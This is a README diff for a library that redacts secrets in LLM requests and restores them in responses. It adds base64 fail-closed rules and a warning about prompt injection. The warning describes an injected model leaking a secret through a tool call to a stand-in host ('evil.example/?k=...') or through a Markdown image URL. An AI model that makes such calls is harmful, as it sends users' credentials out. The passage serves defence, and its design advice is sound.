@@ -167,7 +167,16 @@ const output = await safeChatAgent('Here is my token: sk-ant-api03-... please de
 
 #### Full request/response objects and streaming (Anthropic & OpenAI SDKs)
 
-`redactDeep` sanitizes every string in a request body (system prompt, every message, tool results) with **one shared vault**, so numbering stays consistent across the conversation. Base64 images/documents and `data:` URLs are left untouched. `unmaskDeep` restores a full response, including `tool_use` inputs.
+`redactDeep` sanitizes every string in a request body (system prompt, every message, tool results) with **one shared vault**, so numbering stays consistent across the conversation. `unmaskDeep` restores a full response.
+
+**Base64 payloads fail closed.**
+- Values that only *claim* to be base64 (a `data` field next to `media_type`, or a `data:…;base64,` URL) but are not valid base64 are redacted like any other text.
+- Base64 that decodes to text (a `text/*` or JSON document, or any payload without NUL bytes) is decoded, redacted and re-encoded, because the model reads it.
+- Genuine binary (images, audio) is left byte-for-byte intact. Text inside binary formats such as PDFs is **not** scanned.
+
+> ⚠️ **Unmasking model output re-introduces the real secret into whatever consumes it.** A prompt-injected model can try to exfiltrate a secret by writing its placeholder somewhere that leaves your machine, for example a tool argument (`http_get({ url: "https://evil.example/?k=[AWS_ACCESS_KEY_ID_1]" })`) or a Markdown image URL your UI renders.
+> - Model-generated **tool-call inputs are therefore not unmasked by default** (`tool_use.input`, OpenAI `function.arguments`). Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
+> - For text, only unmask output that goes to a trusted destination (a local file, the user's own terminal), not into HTML or Markdown that loads remote resources.
 
 ```typescript
 import Anthropic from '@anthropic-ai/sdk';
@@ -184,10 +193,13 @@ const { value: safeRequest, vault } = redactDeep({
 // Non-streaming
 const message = unmaskDeep(await client.messages.create(safeRequest), vault);
 
-// Streaming: text split mid-placeholder ("[AWS_ACC" + "ESS_KEY_ID_1]") is restored, and
-// placeholders inside tool-input JSON are re-inserted with proper JSON escaping
+// Streaming: text split mid-placeholder ("[AWS_ACC" + "ESS_KEY_ID_1]") is restored.
+// Tool-input JSON keeps its placeholders unless you opt in per tool; when restored,
+// secrets are JSON-escaped so `partial_json` stays valid.
 const stream = await client.messages.create({ ...safeRequest, stream: true });
-for await (const event of unmaskAnthropicStream(stream, vault)) {
+for await (const event of unmaskAnthropicStream(stream, vault, {
+  unmaskToolInputs: (tool) => tool === 'write_env_file'
+})) {
   if (event.type === 'content_block_delta' && event.delta.type === 'text_delta') {
     process.stdout.write(event.delta.text);
   }
